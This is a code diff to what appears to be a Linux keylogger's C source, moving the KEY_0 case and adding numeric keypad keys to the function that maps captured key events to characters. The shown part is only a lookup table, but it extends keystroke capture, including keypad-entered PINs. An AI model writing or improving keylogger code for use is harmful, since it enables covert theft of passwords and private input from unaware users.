@@ -125,6 +125,7 @@ static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
     unsigned short code = e.code;
 
     switch (code) {
+    case KEY_0: lc = '0'; uc = ')'; break;
     case KEY_1: lc = '1'; uc = '!'; break;
     case KEY_2: lc = '2'; uc = '@'; break;
     case KEY_3: lc = '3'; uc = '#'; break;
@@ -134,7 +135,6 @@ static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
     case KEY_7: lc = '7'; uc = '&'; break;
     case KEY_8: lc = '8'; uc = '*'; break;
     case KEY_9: lc = '9'; uc = '('; break;
-    case KEY_0: lc = '0'; uc = ')'; break;
 
     case KEY_A: lc = 'a'; uc = 'A'; break;
     case KEY_B: lc = 'b'; uc = 'B'; break;
@@ -181,6 +181,22 @@ static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
     case KEY_ENTER: lc = uc = '\n'; break;
     case KEY_TAB: lc = uc = '\t'; break;
     case KEY_SPACE: lc = uc = ' '; break;
+
+    /* Keypad */
+    case KEY_KP0: lc = uc = '0'; break;
+    case KEY_KP1: lc = uc = '1'; break;
+    case KEY_KP2: lc = uc = '2'; break;
+    case KEY_KP3: lc = uc = '3'; break;
+    case KEY_KP4: lc = uc = '4'; break;
+    case KEY_KP5: lc = uc = '5'; break;
+    case KEY_KP6: lc = uc = '6'; break;
+    case KEY_KP7: lc = uc = '7'; break;
+    case KEY_KP8: lc = uc = '8'; break;
+    case KEY_KP9: lc = uc = '9'; break;
+
+    case KEY_KPMINUS: lc = uc = '-'; break;
+    case KEY_KPPLUS: lc = uc = '+'; break;
+    case KEY_KPDOT: lc = uc = '.'; break;
 
     default: lc = uc = '\0'; break;
     }
